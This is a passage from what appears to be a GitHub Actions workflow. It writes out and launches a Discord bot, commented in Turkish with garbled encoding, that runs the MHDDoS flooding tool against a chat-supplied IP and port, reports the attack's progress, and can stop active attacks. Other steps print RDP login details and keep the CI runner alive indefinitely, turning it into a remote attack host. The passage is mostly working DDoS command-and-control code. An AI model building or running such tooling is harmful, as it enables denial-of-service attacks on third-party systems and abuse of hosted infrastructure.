                  os.chdir(MHDDOS_PATH)
          
                  try:
                      # Komutu Ã§alÄ±ÅŸtÄ±r
                      process = await asyncio.create_subprocess_exec(
                          *command,
                          stdout=asyncio.subprocess.PIPE,
                          stderr=asyncio.subprocess.PIPE
                      )
                      
                      # SÃ¼reci listeye ekle
                      active_processes.append(process)
                      
                      # BaÅŸlangÄ±Ã§ mesajÄ±
                      await message.channel.send(
                          f"âœ… SaldÄ±rÄ± baÅŸlatÄ±ldÄ±!\n"
                          f"ğŸ¯ Hedef: {ip}:{port}\n"
                          f"â±ï¸ SÃ¼re: {duration} saniye\n"
                          f"ğŸ“¦ Paket HÄ±zÄ±: 10000 pps"
                      )
                      
                      # Ã‡Ä±ktÄ±larÄ± bekle (asenkron)
                      stdout, stderr = await process.communicate()
                      
                      # SÃ¼reci listeden Ã§Ä±kar
                      if process in active_processes:
                          active_processes.remove(process)
                      
                      # SonuÃ§larÄ± kontrol et
                      if process.returncode == 0:
                          await message.channel.send("âœ… SaldÄ±rÄ± baÅŸarÄ±yla tamamlandÄ±!")
                      else:
                          error_msg = stderr.decode().strip() if stderr else "Bilinmeyen hata"
                          await message.channel.send(f"âŒ SaldÄ±rÄ± sÄ±rasÄ±nda hata oluÅŸtu:\n```\n{error_msg}\n```")
                          
                  except Exception as e:
                      await message.channel.send(f"âŒ SaldÄ±rÄ± baÅŸlatÄ±lÄ±rken hata: `{str(e)}`")
                  finally:
                      # Orijinal dizine geri dÃ¶n
                      os.chdir(original_dir)
          
              # TÃ¼m saldÄ±rÄ±larÄ± durdur
              elif message.content == '!stop':
                  if not active_processes:
                      await message.channel.send("âŒ Aktif saldÄ±rÄ± bulunamadÄ±!")
                      return
          
                  stopped_count = 0
                  for process in active_processes:
                      try:
                          process.terminate()
                          await process.wait()
                          stopped_count += 1
                      except:
                          try:
                              process.kill()
                              await process.wait()
                              stopped_count += 1
                          except:
                              pass
                  
                  # Listeyi temizle
                  active_processes.clear()
                  
                  await message.channel.send(f"âœ… {stopped_count} saldÄ±rÄ± durduruldu!")
          
          # Botu baÅŸlat
          try:
              client.run(BOT_TOKEN)
          except discord.errors.LoginFailure:
              print("GeÃ§ersiz Discord token! LÃ¼tfen token'Ä± kontrol edin.")
          except Exception as e:
              print(f"Bot baÅŸlatÄ±lÄ±rken hata: {str(e)}")
          "@
          
          # Bot kodunu dosyaya yaz
          $botCode | Out-File -FilePath "C:\Users\RDP\Desktop\discord_bot.py" -Encoding UTF8

      - name: Start Discord Bot
        run: |
          # Botu baÅŸlat
          Start-Process python -ArgumentList "C:\Users\RDP\Desktop\discord_bot.py" -NoNewWindow

      - name: Display RDP Access Information
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:MACHINE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $(echo $env:RDP_CREDS)"
          Write-Host "==================`n"
          
          # Keep runner active indefinitely (or until manually cancelled)
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
